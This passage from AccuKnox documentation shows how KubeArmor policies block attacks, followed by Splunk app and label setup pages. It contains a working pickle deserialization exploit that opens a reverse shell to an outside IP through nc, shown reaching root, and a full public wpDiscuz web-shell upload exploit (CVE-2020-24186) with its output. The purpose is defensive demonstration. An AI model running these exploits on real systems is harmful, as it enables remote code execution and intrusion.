/app/templates/layout.html\n      fromSource:\n      - path: /usr/bin/python3.8\n    - path: /app/templates/uploads.html\n      fromSource:\n      - path: /usr/bin/python3.8\n    - path: /usr/lib/python3.8/encodings/__pycache__/unicode_escape.cpython-38.pyc\n      fromSource:\n      - path: /usr/bin/python3.8\n  action: Allow\n</code></pre> <p>Note</p> <p>Policy name will change according to environment</p> <p>We also have predefined policies in the policy-template GitHub repository which can be utilized to achieve the same level of runtime security without having to generate autodiscovery policies.  The only point to remember is that you need to know the namespace and labels for your Python workloads</p>"},{"location":"how-to/protect-python-microservice/#the-policies-in-action","title":"The Policies in-action","text":"<p>It is time to verify whether we were able to achieve zero trust by using the auto-discovered policies generated by AccuKnox opensource tools. To test this we will scan the application with some popular scanners.</p> <p>Before that let us verify that the policies are applied correctly to the cluster</p> <pre><code>kubectl get cnp,ksp -A\nNAMESPACE   NAME                                                                AGE \ndefault     ciliumnetworkpolicy.cilium.io/autopol-egress-fdjkltpvf              15m\n\nNAMESPACE   NAME                                                                AGE \ndefault     kubearmorpolicy.security.kubearmor.com/autopol-system-269415943     14m\n</code></pre>"},{"location":"how-to/protect-python-microservice/#initiating-the-attack-scenario","title":"Initiating the Attack scenario","text":"<p>By using Burpsuite as initial recon, we were able to determine that it is running on a python server and the API name gave away that it uses the pickle module.</p> <p>We\u2019ll make use of the pickle module and write a python exploit that lets us create a reverse shell onto the pod.</p> <p>Create a python file and name it exploit.py and then we'll create our class RCE and let its reduce method return a tuple of arguments for the callable object.</p> <pre><code>import pickle\nimport base64\nimport os\n\nclass RCE:\n    def __reduce__(self):\n        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '\n               '/bin/sh -i 2&gt;&amp;1 | nc 34.125.245.75 4444 &gt; /tmp/f')\n        return os.system, (cmd,)\n\nif __name__ == '__main__':\n   pickled = pickle.dumps(RCE())\n   with open('parrot.pkl', 'wb') as f:\n      pickle.dump(RCE(), f)\n   print(base64.urlsafe_b64encode(pickled))\n</code></pre> <p>Our callable will be os.system and the argument will be a common reverse shell snippet using a named pipe. Let's create a .pkl file and upload it to the application via UI. Before executing let's take a look at the exploit file itself.</p> <pre><code>cat exploit.py \n\nimport pickle \nimport base64 \nimport os \n\nclass RCE: \n    def __reduce__(self): \n        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | ' \n               '/bin/sh 2&gt;&amp;1 1 nc 34.125.245.75 4444 &gt; /tmp/f') \n        return os.system, (cmd,) \n\nif name == '__main__'' \n    pickled = pickle.dumps(RCE()) \n    with open('parrotl.pkl', 'wb'') as f: \n        pickle.dump(RCE(), f) \n    print(base64.urlsafe_b64encode(pickled)) \n</code></pre> <p>Time to create our python exploit payload.</p> <pre><code>python3 exploit.py \n\nb'gA5VcgAAAAAAAACMBXByc2l4lIwGc3lzdUtlJOUjEdyb5AydGlwL2Y7IG1r2mlmbyAydGlwL2Y7IGNhdCAydGlwL2YgfC 1wL2aUliZR5lC4=' </code></pre> <p>We will use <code>nc -lnvp 4444</code> command to listen to incoming connection on port 4444.</p> <pre><code>nc -lnvp 4444\nlistening on [any] 4444 ...\n</code></pre> <p>We\u2019ll go to  http://34.123.162.173/upload_pickle  and upload the exploit file  parrot.pkl  which we created earlier.</p> <p>We\u2019ll get a success message  file upload successfully  without a reverse shell opened on the listener machine.</p> <p></p> <pre><code>nc -lnvp 4444 \n\nlistening on [any] 4444 ...\n</code></pre>"},{"location":"how-to/protect-python-microservice/#checking-the-policy-logs-on-kubearmor","title":"Checking the policy logs on KubeArmor","text":"<p>To check how to do it, kindly go through our  help section</p> <p>Blocked Log Created by KubeArmor</p> <pre><code>{\n\"timestamp\": 1638223573,\n\"updatedTime\": \"2021-11-29T22:06:13.493285Z\",\n\"hostName\": \"gke-sample-cluster-default-pool-3be49535-k4cp\",\n\"namespaceName\": \"default\",\n\"podName\": \"pickle-app-6d8c67b4f6-fk2qs\",\n\"containerID\": \"9e57f01622b423e04bb2071d54f95dca2044a3f8467e897c5b696307a6080be7\",\n\"containerName\": \"pickle-app\",\n\"hostPid\": 1158108,\n\"ppid\": 370,\n\"pid\": 371,\n\"uid\": 0,\n\"policyName\": \"autopol-system-269415943\",\n\"severity\": \"1\",\n\"type\": \"MatchedPolicy\",\n\"source\": \"python3\",\n\"operation\": \"Process\",\n\"resource\": \"/bin/sh -c rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc 34.125.245.75 4444 &gt; /tmp/f\",\n\"data\": \"syscall=SYS_EXECVE\",\n\"action\": \"Block\",\n\"result\": \"Permission denied\"\n}\n</code></pre> <p>Now let us delete the policies which we applied after auto discovering and run the scenario once more</p> <p><pre><code>kubectl apply delete cnp,ksp --all\nciliumnetworkpolicy.cilium.io \"autopol-egress-fdjkltpvf\" deleted\nkubearmorpolicy.security.kubearmor.com \"autopol-system-269415943\" deleted\n</code></pre> We\u2019ll go to  http://34.123.162.173/upload_pickle  and upload the same exploit file parrot.pkl</p> <p>The moment we upload the parrot.pkl file we will get a reverse shell opened on the listener machine.</p> <p></p> <p><pre><code>nc -lnvp 4444 \n\nlistening on [any] 4444 ... \nconnect to [10.182.0.13] from (UNKNOWN) [35.184.238.249] 38292 \n/bin/sh: 0: can't access tty; job control turned off # whoami\nroot\n\n#hostname\npickle-app-7f7fbdb76b-64mq5\n</code></pre> We could see that the attack happened after we deleted the policies which were auto-discovered in a safe environment. This means applying the auto-discovered policies ensured that the workload had been protected at runtime.</p>"},{"location":"how-to/protect-python-microservice/#accuknoxs-policy-templates-repository","title":"AccuKnox's policy templates repository","text":"<p>AccuKnox's policy templates is an open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit  policy-templates  to download and apply policies.</p>"},{"location":"how-to/protect-python-microservice/#conclusion","title":"Conclusion","text":"<p>Insecure deserialization is very difficult to identify while conducting security tests. Insecure deserialization can be prevented by going through the source code for the vulnerable code base and by input validation and output sanitization. Insecure deserialization in conjunction with a Remote Code Execution (RCE) will undoubtedly compromise the entire infrastructure.</p> <p>Using KubeArmor, an organization can effectively protect against these sorts of accidental developer-introduced vulnerabilities.</p>"},{"location":"how-to/protect-wordpress-application/","title":"How to protect WordPress application using AccuKnox","text":"<p>The modern content management system (CMS) has made website creation easier than ever. By utilizing the right platform, you will have access to features that can make the process much simpler.</p> <p></p>"},{"location":"how-to/protect-wordpress-application/#introduction","title":"Introduction","text":"<p>The modern Content Management System (CMS) has made website creation easier than ever. By utilizing the right platform, you will have access to features that can make the process much simpler. There are plenty of CMS to choose from, however, each with its advantages and drawbacks.</p> <p>In this section, we\u2019ll be talking about a critical vulnerability found in the WordPress plugin  <code>wpDiscuz</code>. The <code>wpDiscuz</code>  is a plugin designed to create responsive comment areas on WordPress installations. It allows users to discuss topics and easily personalize their feedback with a rich text editor.  </p> <p>AccuKnox  provides runtime cloud security for your applications. In this cookbook, we will demonstrate how MySQL applications can be protected with  AccuKnox.</p>"},{"location":"how-to/protect-wordpress-application/#what-are-we-trying-to-achieve","title":"What are we trying to achieve?","text":"<p>In the last revision of the wpDiscuz plugin, releases 7. x. x, they added the ability to include image attachments in the comments that are uploaded to the website and included in the comments. Unfortunately, there was no security protection associated with the implementation of this feature, creating a critical vulnerability.  <code>wpDiscuz</code>  comments were designed to allow only image attachments. However, due to the file mime type detection functions that were used, the file type verification could easily be bypassed, allowing unauthenticated users the ability to upload any type of file, including PHP files.</p> <p>We will be taking a look at how to mimic the exploit and how we can use  KubeArmor  runtime security policies to defend from the attack without compromising the use of the plugin.</p> <p>Score:  10 CRITICAL Vector :  CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H Attack Vector:  NETWORK Attack Complexity:  LOW Privileges Required:  NONE User Interaction:  NONE Scope:  CHANGED Confidentiality:  HIGH Integrity:  HIGH Availability:  HIGH</p> <p></p> <p>We\u2019ll deploy the WordPress application on Kubernetes and install  <code>wpDiscuz</code>  on it. Get the external IP of the application to access the same. For this, we have created a complete YAML for WordPress installation on Kubernetes. You can use this predefined deployment file to quickly deploy WordPress to your Kubernetes environment.</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/accuknox/samples/main/wordpress-demo/k8s-wordpress.yaml\n</code></pre> <pre><code>kubectl get pod -n wordpress-mysql\n\nNAME                               READY   STATUS    RESTARTS   AGE\nwordpress-5d5d448dcc-52mcj         1/1     Running   0          4d10h\nwordpress-mysql-7757f9f8c8-2j8wm   1/1     Running   0          4d9h\n\nkubectl get svc -n wordpress-mysql\n\nNAME             TYPE          CLUSTER-IP   EXTERNAL-IP   PORT(S)       \nwordpress        LoadBalancer  10.16.12.13  35.232.52.87  80:31790/TCP \nwordpress-mysql  ClusterIP     None         &lt;none&gt;        3306/TCP </code></pre> <p>Here the external IP is http://35.232.52.87/</p>"},{"location":"how-to/protect-wordpress-application/#initiating-the-attack","title":"Initiating the Attack","text":"<p>Go to  http://35.232.52.87/2021/12/16/hello-world/  and create a comment. With a simple  <code>inspect</code>  of the webpage, we can see that WordPress is using  <code>wpDiscuz</code>  in it to create responsive comments.</p> <p>Here, replace 35.232.52.87 from your own IP.</p> <p>With the URL in hand, we\u2019ll try to exploit the application by uploading a PHP code into the server and thereby granting us RCE.</p> <p>To make this happen we use a public exploit for the  <code>wpDiscuz</code>  vulnerability.</p> <pre><code>#!/bin/python3\n\n# Exploit Title: WordPress Plugin wpDiscuz 7.0.4 - Unauthenticated Remote Code Execution\n# Google Dork: N/A\n# Date: 2021/06/08\n# Exploit Author: Fellipe Oliveira\n# Vendor Homepage: https://gvectors.com/\n# Software Link: https://downloads.wordpress.org/plugin/wpdiscuz.7.0.4.zip\n# Version: wpDiscuz 7.0.4\n# Tested on: Debian9, Windows 7, Windows 10 (Wordpress 5.7.2)\n# CVE : CVE-2020-24186\n# Thanks for the great contribution to the code: Z3roC00l (https://twitter.com/zeroc00I)\n\nimport requests\nimport optparse\nimport re\nimport random\nimport time\nimport string\nimport json\n\nparser = optparse.OptionParser()\nparser.add_option('-u', '--url', action=\"store\", dest=\"url\", help=\"Base target host: http://192.168.1.81/blog\")\nparser.add_option('-p', '--path', action=\"store\", dest=\"path\", help=\"Path to exploitation: /2021/06/blogpost\")\n\n\noptions, args = parser.parse_args()\n\nif not options.url or not options.path:\n    print('[+] Specify an url target')\n    print('[+] Example usage: exploit.py -u http://192.168.1.81/blog -p /wordpress/2021/06/blogpost')\n    print('[+] Example help usage: exploit.py -h')\n    exit()\n\nsession = requests.Session()\n\nmain_url = options.url\npath = options.path\nurl_blog = main_url + path\nclean_host = main_url.replace('http://', '').replace('/wordpress','')\n\ndef banner():\n    print('---------------------------------------------------------------')\n    print('[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution')\n    print('[-] File Upload Bypass Vulnerability - PHP Webshell Upload')\n    print('[-] CVE: CVE-2020-24186')\n    print('[-] https://github.com/hevox')\n    print('--------------------------------------------------------------- \\n')\n\ndef csrfRequest():\n    global wmuSec\n    global wc_post_id\n\n    try:\n        get_html = session.get(url_blog)\n        response_len = str(len(get_html.text))\n        response_code = str(get_html.status_code)\n        print('[+] Response length:['+response_len+'] | code:['+response_code+']')\n\n        raw_wmu = get_html.text.replace(',','\\n')\n        wmuSec = re.findall('wmuSecurity.*$',raw_wmu,re.MULTILINE)[0].split('\"')[2]\n        print('[!] Got wmuSecurity value: '+ wmuSec +'')\n        raw_postID = get_html.text.replace(',','\\n')\n        wc_post_id = re.findall('wc_post_id.*$',raw_postID,re.MULTILINE)[0].split('\"')[2]\n        print('[!] Got wmuSecurity value: '+ wc_post_id +' \\n')\n\n    except requests.exceptions.HTTPError as err:\n        print('\\n[x] Failed to Connect in: '+url_blog+' ')\n        print('[x] This host seems to be Down')\n        exit()\n\n\ndef nameRandom():\n    global shell_name \n    print('[+] Generating random name for Webshell...')\n    shell_name = ''.join((random.choice(string.ascii_lowercase) for x in range(15)))\n    time.sleep(1)  \n    print('[!] Generated webshell name: '+shell_name+'\\n')\n\n    return shell_name\n\n\ndef shell_upload():\n    global shell\n    print('[!] Trying to Upload Webshell..')\n    try:\n        upload_url = main_url + \"/wp-admin/admin-ajax.php\"\n        upload_cookies = {\"wordpress_test_cookie\": \"WP%20Cookie%20check\", \"wpdiscuz_hide_bubble_hint\": \"1\"}\n        upload_headers = {\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"pt-BR,pt;q=0.8,en-US;q=0.5,en;q=0.3\", \"Accept-Encoding\": \"gzip, deflate\", \"X-Requested-With\": \"XMLHttpRequest\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------2032192841253859011643762941\", \"Origin\": \"http://\"+clean_host+\"\", \"Connection\": \"close\", \"Referer\": url_blog}\n        upload_data = \"-----------------------------2032192841253859011643762941\\r\\nContent-Disposition: form-data; name=\\\"action\\\"\\r\\n\\r\\nwmuUploadFiles\\r\\n-----------------------------2032192841253859011643762941\\r\\nContent-Disposition: form-data; name=\\\"wmu_nonce\\\"\\r\\n\\r\\n\"+wmuSec+\"\\r\\n-----------------------------2032192841253859011643762941\\r\\nContent-Disposition: form-data; name=\\\"wmuAttachmentsData\\\"\\r\\n\\r\\n\\r\\n-----------------------------2032192841253859011643762941\\r\\nContent-Disposition: form-data; name=\\\"wmu_files[0]\\\"; filename=\\\"\"+shell_name+\".php\\\"\\r\\nContent-Type: image/png\\r\\n\\r\\nGIF689a;\\r\\n\\r\\n&lt;?php system($_GET['cmd']); ?&gt;\\r\\n\\x1a\\x82\\r\\n-----------------------------2032192841253859011643762941\\r\\nContent-Disposition: form-data; name=\\\"postId\\\"\\r\\n\\r\\n\"+wc_post_id+\"\\r\\n-----------------------------2032192841253859011643762941--\\r\\n\"\n        check = session.post(upload_url, headers=upload_headers, cookies=upload_cookies, data=upload_data)\n        json_object = (json.loads(check.text))\n        status = (json_object[\"success\"])\n\n        get_path = (check.text.replace(',','\\n'))\n        shell_pret = re.findall('url.*$',get_path,re.MULTILINE)\n        find_shell = str(shell_pret)\n        raw = (find_shell.replace('\\\\','').replace('url&amp;quot;:&amp;quot;','').replace('\\',','').replace('&amp;quot;','').replace('[\\'',''))\n        shell = (raw.split(\" \",1)[0])\n\n        if status == True:\n            print('[+] Upload Success... Webshell path:' +shell+' \\n')\n        else:\n            print('[x] Failed to Upload Webshell in: '+ url_blog +' ')\n            exit()\n\n    except requests.exceptions.HTTPError as conn:\n        print('[x] Failed to Upload Webshell in: '+ url_blog +' ')\n\n    return shell\n\n\ndef code_exec():\n    try:\n            while True:\n                cmd = input('&gt; ')\n                codex = session.get(shell + '?cmd='+cmd+'')\n                print(codex.text.replace('GIF689a;','').replace('\ufffd',''))\n    except:\n        print('\\n[x] Failed to execute PHP code...')\n\n\nbanner()\ncsrfRequest()\nnameRandom()\nshell_upload()\ncode_exec()\n</code></pre> <p>This python code requires the URL to the WordPress site and the blogpost endpoint. We\u2019ll get both of these from the UI.</p> <pre><code>python3 exploit.py -u http://35.232.52.87/ -p /2021/12/16/hello-world\n</code></pre> <p>The command will upload an arbitrary PHP file with  <code>&lt;?php system($_GET['cmd']); ?&gt;</code>  and then access this file to trigger execution on the server, thereby achieving remote code execution.</p> <pre><code>---------------------------------------------------------------\n[-] Wordpress Plugin wpDiscuz 7.0.4 - Remote Code Execution\n[-] File Upload Bypass Vulnerability - PHP Webshell Upload\n[-] CVE: CVE-2020-24186\n[-] https://github.com/hevox\n--------------------------------------------------------------- [+] Response length:[101559] | code:[200]\n[!] Got wmuSecurity value: fbf0656b17\n[!] Got wmuSecurity value: 1 [+] Generating random name for Webshell...\n[!] Generated webshell name: bmrorpjvojkbbko\n\n[!] Trying to Upload Webshell..\n[+] Upload Success... Webshell path:http://35.232.52.87/wp-content/uploads/2021/12/bmrorpjvojkbbko-1640016084.4304.php \n\n&gt; hostname\n\n\nwordpress-5d5d448dcc-52mcj\n\n&gt; </code></pre>"},{"location":"how-to/protect-wordpress-application/#defending-against-the-attack","title":"Defending against the Attack","text":"<p>In order to defend against the attack, we dig a little deeper and found the root cause to be the \"unrestricted file upload\" when coupled with double extensions (e.g., \".php.gif\") bypassed sanity checks.</p> <p>To resolve the vulnerability you can update  <code>wpDiscuz</code>  to version 7.0.5+ by experiencing downtime or use KubeArmor\u2019s pre-tailored policy to remove the vulnerability even without changing anything.</p> <p>About the Policy:</p> <pre><code># KubeArmor is an open source software that enables you to protect your cloud workload at runtime.\n# To learn more about KubeArmor visit: \n# https://www.accuknox.com/kubearmor/ \n\napiVersion: security.kubearmor.com/v1\nkind: KubeArmorPolicy\nmetadata:\n  name: ksp-cve-2020-24186-deny-wordpress-rce\n  namespace: wordpress-mysql # Change your namespace\nspec:\n  tags: [\"CVE\", \"WordPress-RCE\", \"CVE-2020-24186\"]\n  message: \"Alert! *.php file upload to wp-content subdirectory detected\"\n  selector:\n    matchLabels:\n      app: wordpress   #change this label with your label\n  file:\n    severity: 5\n    matchPatterns:\n    - pattern: /var/www/html/wp-content/uploads/**/*.php\n    - pattern: /var/www/html/wp-content/uploads/**/*.sh\n    action: Block\n</code></pre> <p>You can simply take advantage of our open-source  GitHub  inventory, and apply  Policy  directly from there:</p> <pre><code>kubectl apply -f https://raw.githubusercontent.com/kubearmor/policy-templates/main/cve/system/ksp-cve-2020-24186-deny-wordpress-rce.yaml\n</code></pre>"},{"location":"how-to/protect-wordpress-application/#checking-the-policy-logs-on-kubearmor","title":"Checking the policy logs on KubeArmor","text":"<p>To check how to do it, kindly go through our  help section.</p> <p>Blocked Policy Log Created by KubeArmor</p> <pre><code>{\n\"timestamp\": 1640059272,\n\"updatedTime\": \"2021-12-21T04:01:12.676169Z\",\n\"hostName\": \"gke-cys-poc-default-pool-3be49535-k4cp\",\n\"namespaceName\": \"wordpress-mysql\",\n\"podName\": \"wordpress-5d5d448dcc-52mcj\",\n\"containerID\": \"9d477215d2288de4cd5ff63f387a808fe1bf3663d130362bebf33c546427e09c\",\n\"containerName\": \"wordpress\",\n\"hostPid\": 3863212,\n\"ppid\": 1,\n\"pid\": 120,\n\"uid\": 33,\n\"type\": \"ContainerLog\",\n\"source\": \"apache2\",\n\"operation\": \"File\",\n\"resource\": \"/var/www/html/wp-content/uploads/2021/12/xjeyirtptddiemf-1640059272.6737.php\",\n\"data\": \"syscall=SYS_OPEN flags=O_WRONLY|O_CREAT|O_TRUNC\",\n\"result\": \"Permission denied\"\n}\n</code></pre>"},{"location":"how-to/protect-wordpress-application/#accuknoxs-policy-templates-repository","title":"AccuKnox's policy templates repository","text":"<p>AccuKnox's policy templates is an open-source repo that also contains a wide range of attack prevention techniques including MITRE, as well as hardening techniques for your workloads. Please visit policy-templates to download and apply policy policies.</p>"},{"location":"how-to/protect-wordpress-application/#conclusion","title":"Conclusion","text":"<p>In this post, we detailed a flaw in  <code>wpDiscuz</code>  that provided unauthenticated users with the ability to upload arbitrary files, including PHP files, and execute those files on the server. Thus leading to an RCE and resource hijacking.</p> <p>Using KubeArmor, an organization can effectively protect against these sorts of accidental developer-introduced vulnerabilities.</p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/","title":"AccuKnox Splunk App","text":""},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#introduction","title":"Introduction","text":"<p>The AccuKnox Splunk App is designed to deliver operational reporting as well as a simplified and configurable dashboard. Users can view the real-time alerts in form of logs and telemetries.</p> <p>Important features  - Dashboard to track the real time alerts genrated from K8s cluster.  - Data models with pivots for easy access to data and visualization.  - Filter out the Alerts based on defferent namespaces, pods, operations, severity, tags and the actions of policies.  - Drilldown ability to see how the alerts genrated, what policy was violated and what was the result for the same.</p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#installation","title":"Installation","text":""},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#prerequisites","title":"Prerequisites :","text":"<p>1. K8s Cluster with AccuKnox agents installed, up and running fine. KubeArmor and Feeder Service are mandatory. The environment variable for the feeder is set for the K8s cluster in use.</p> <p>2. An active Splunk Deployment and Access to the same.</p> <p>To depoy Splunk on Kubernetes Cluster follow https://splunk.github.io/splunk-operator/ and for Linux follow https://docs.splunk.com/Documentation/Splunk/9.0.1/Installation/InstallonLinux</p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#where-to-install-it","title":"Where to install it?","text":"<p>Splunk App can be installed on Splunk Enterprise Deployment done on K8s or VM. User can install the App using three different ways.</p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#option-1-install-from-file","title":"Option 1: Install from File","text":"<p>This App can be installed by Uploading the file to the Splunk UI.   1. Download the AccuKnox Splunk App file, by typing the following command. This file can be downloaded anywhere from where the user can upload the file to Splunk UI.  <pre><code>git clone https://github.com/accuknox/splunk.git AccuKnox\ntar -czvf AccuKnox.tar.gz AccuKnox\n</code></pre> 2. Log in to your Splunk Deployment.  3. Click on the gear  icon next to Apps.  4. This will navigate you to the Apps Dashboard. On the top right, click on Install app from file.  5. This will navigate to Upload App Screen. Select AccuKnox.tar.gz file downloaded in the first step, and upload. In case you are updating the app and it\u2019s already installed, mark the check box for Upgrade App.   6. Once Uploaded the App will be installed on the Splunk Deployment, with a confirmation message, \u201cAccuKnox\" was installed successfully. Click on Launch App to view the App.</p> <p> 7. You can Restart Splunk for the App to work properly. Go to Settings &gt; Server Control &gt; Restart Splunk, Restarting the app will take approx. 1-2 minutes.</p> <p> 8. Wait for Splunk to Restart And you can log in back to see the AccuKnox App in the App section.</p> <p> 9. Click on the AccuKnox App to launch the App. This will navigate you to the App dashboard.</p> <p></p> <p>Note:</p> <ol> <li> <p>If Dashboards shows no data, you need to configure the HEC on Splunk and Forward the data first, check below how to configure and create HEC and  forward the data.</p> </li> <li> <p>If data is not being pushed, Login to Splunk &gt; Setting &gt; Data Input &gt; Select HTTP Event Collector &gt; Global Settings &gt; Disable SSL if Enabled by unchecking the box.</p> </li> </ol>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#option-2-install-the-app-from-splunkbase","title":"Option 2: Install the App from SplunkBase","text":"<p>Install the AccuKnox App by downloading it from the App homepage.</p> <p> </p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#option-3-install-from-github","title":"Option 3: Install from GitHub","text":"<p>This App is available on SplunkBase and Github. Optionally, you can clone the GitHub repository to install the App. Please feel free to submit contributions to the App using pull requests on GitHub.</p> <ol> <li> <p>Locate the Splunk Deployment done in your environment.</p> </li> <li> <p>Navigate to the Splunk App directory. For Linux users <code>/opt/splunk/etc/apps</code> and windows users <code>\\Program Files\\Splunk\\etc\\apps</code></p> </li> </ol> <p>From the directory <code>$SPLUNK_HOME/etc/apps/</code>, type the following command: <pre><code>git clone https://github.com/accuknox/splunk.git AccuKnox\n</code></pre></p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#what-data-types-does-accuknox-exportintegrate-into-splunk","title":"What data types does AccuKnox export/integrate into Splunk?","text":"<ul> <li>KubeArmor Alert</li> <li>KubeArmor Container Logs</li> <li>Cilium Alerts</li> <li>Cilium Logs</li> </ul> <p>Managing data sent to Splunk, What can be sent?</p> <p>AccuKnox can forward the data to Splunk in two ways:</p> <ol> <li>From feeder service running on client cluster </li> <li>From SAAS platform</li> </ol>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#forwarding-events-to-splunk-from-feeder","title":"Forwarding Events to Splunk from Feeder","text":"<p>Prerequisites: 1.  Feeder Service and KubeArmor are Installed and running on the user\u2019s K8s Cluster.</p> <ol> <li>A sample application can be used to generate the alerts, check how to deploy a sample application, and generate alerts.</li> </ol>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#configuring-feeder-for-the-first-time-to-forward-the-events","title":"Configuring feeder for the first time to forward the events:","text":"<p>1 . Assuming the user is inside their K8s Cluster, type the following command to edit the feeder deployment. <pre><code>kubectl edit deployment feeder-service -n accuknox-agents\n</code></pre> 2 . The below Configuration parameters needs be updated for Splunk configuration. (Default params in code blocks need to be modified, line number 93 of feeder chart )</p> <p>To start editing press Insert button name: SPLUNK_FEEDER_ENABLED value: <code>false</code></p> <p>change value to <code>true</code> to enable the feed</p> <p>name: SPLUNK_FEEDER_URL</p> <p>value: <code>https://&lt;splunk-host&gt;</code></p> <p>change value to the <code>HEC URL</code> created.</p> <p>name: SPLUNK_FEEDER_TOKEN</p> <p>value: <code>\" x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000\"</code></p> <p>change  the value with <code>generated token</code> for HEC</p> <p>name: SPLUNK_FEEDER_SOURCE_TYPE</p> <p>value: <code>\"http:kafka\"</code></p> <p>change the value to <code>http:kafka</code> if not added</p> <p>name: SPLUNK_FEEDER_SOURCE _ value:_  <code>\"json\"</code></p> <p>change the value as per your choice</p> <p>name: SPLUNK_FEEDER_INDEX</p> <p>value: <code>\"main\"</code></p> <p>change the value as to <code>main</code></p> <p>Hit <code>ctrl + c</code> once editing is done, and enter <code>:wq</code> and hit <code>enter</code> to save the configuration.</p> <p>Additionaly you can Enable and Disable the event forwarding by Enabling/Disabling Splunk (Runtime):</p> <pre><code>kubectl set env deploy/feeder-service SPLUNK_FEEDER_ENABLED=\"true\" -n accuknox-agents\n</code></pre> <p>By enabling the flag to true (as above), the events will be pushed to Splunk. And disabling it to <code>false</code> will stop pushing logs.</p> <p>Note: Likewise other configuration parameters can be updated in Runtime.</p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#from-saas-channel-integration","title":"From SAAS, Channel Integration","text":""},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#integration-of-splunk","title":"Integration of Splunk:","text":""},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#1-prerequisites","title":"1. Prerequisites:","text":"<p>Set up Splunk HTTP Event Collector (HEC) to view alert notifications from AccuKnox in Splunk. Splunk HEC lets you send data and application events to a Splunk deployment over the HTTP and Secure HTTP (HTTPS) protocols.</p> <ul> <li> <p>To set up HEC, use instructions in Splunk documentation. For source type,_json is the default; if you specify a custom string on AccuKnox, that value will overwrite anything you set here.</p> </li> <li> <p>Select Settings &gt; Data inputs &gt; HTTP Event Collector and make sure you see HEC added in the list and that the status shows that it is Enabled .</p> </li> </ul>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#2-steps-to-integrate","title":"2. Steps to Integrate:","text":"<ul> <li> <p>Go to Channel Integration.</p> </li> <li> <p>Click integrate now on Splunk.</p> </li> <li> <p>Enter the following details to configure Splunk.</p> </li> <li> <p>Select the Splunk App : From the dropdown, Select Splunk Enterprise.</p> <ul> <li> <p>Integration Name: Enter the name for the integration. You can set any name. e.g., Test Splunk</p> </li> <li> <p>Splunk HTTP event collector URL: Enter your Splunk HEC URL generated earlier. e.g  https://splunk-xxxxxxxxxx.com/services/collector</p> </li> <li> <p>Index: Enter your Splunk Index, once created while creating HEC. e.g  main</p> </li> <li> <p>Token: Enter your Splunk Token, generated while creating HEC URL. e.g  <code>x000x0x0x-0xxx-0xxx-xxxx-xxxxx00000</code></p> </li> <li> <p>Source: Enter the source as <code>http:kafka</code></p> </li> <li> <p>Source Type: Enter your Source Type here, this can be anything and the same will be attach to the event type forwarded to splunk. e.g  <code>_json</code></p> </li> <li> <p>Click Test to check the new functionality, You will receive the test message on configured slack channel. e.g <code>Test Message host = xxxxxx-deployment-xxxxxx-xxx00 source = http:kafka sourcetype = trials</code></p> </li> </ul> </li> <li> <p>Click Save to save the Integration. You can now configure Alert Triggers for Slack Notifications.</p> </li> </ul> <p>How will AccuKnox manage the Splunk data\u2014what will be sent &amp; what will not be sent?</p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#managing-what-type-of-data-can-be-sent-to-splunk","title":"Managing what type of data can be sent to Splunk?","text":"<p>From AccuKnox we can manage the type of data forwardered to integration using triggers. </p>"},{"location":"how-to/SplunkApp/accuKnox-splunk-app-installation-configuration/#how-to-create-a-new-trigger","title":"How to create a new trigger?","text":"<ol> <li> <p>After choosing specific log filter from the Logs Screen, click on <code>Create Trigger</code> button. You can either click elements directly from the log events list, search for elements directly in the filter, or use Search Filters to choose a specific log filter</p> </li> <li> <p>Configure the required options:</p> <p></p> </li> <li> <p>Name: Define an alert trigger name.</p> </li> <li> <p>When to initiate this trigger: Set the frequency of the trigger. You have four options to select, (1) Runtime as it happens (2) Once a day (3) Once a week (4) Once a month</p> </li> <li> <p>Define Threat Level: Define the threat level for the trigger. You have three options (1) High (2) Medium (3) Low</p> </li> <li> <p>Selected Filter: The chosen log filter from step 1 is populated here. You can shift to predefined filters from here also.</p> </li> <li> <p>Notification channel: Choose the notification channel that should receive the alerts.</p> </li> </ol> <p>Note: Before selecting the notification channel, you should complete the  channel integration for this channel. Review the Channel Integration for more context.        Channel Integration Guide</p> <ol> <li>Click <code>Save</code> button to store the trigger in database.</li> </ol>"},{"location":"how-to/SplunkApp/Images/info/","title":"Info","text":"<p>This folder contains the images linked to AccuKnox Splunk App help docs. </p>"},{"location":"label_manager/create_label/","title":"How to create a new label?","text":"<p>The label manager displays currently available labels in your workspace. Users can manually create a new label and add entities to the label.</p>"},{"location":"label_manager/create_label/#create-a-label","title":"Create a label:","text":"<ol> <li> <p>Click <code>Label Manager</code> -&gt; <code>Create Label</code></p> <p>Enter key and value. Change the color of the label if you want.</p> <p></p> </li> <li> <p>Click <code>save</code> button</p> </li> </ol>"},{"location":"label_manager/create_label/#add-entities-to-label","title":"Add entities to label:","text":"<p>Once the user created the label, next needs to associate entities to the label.</p> <p>From two screens 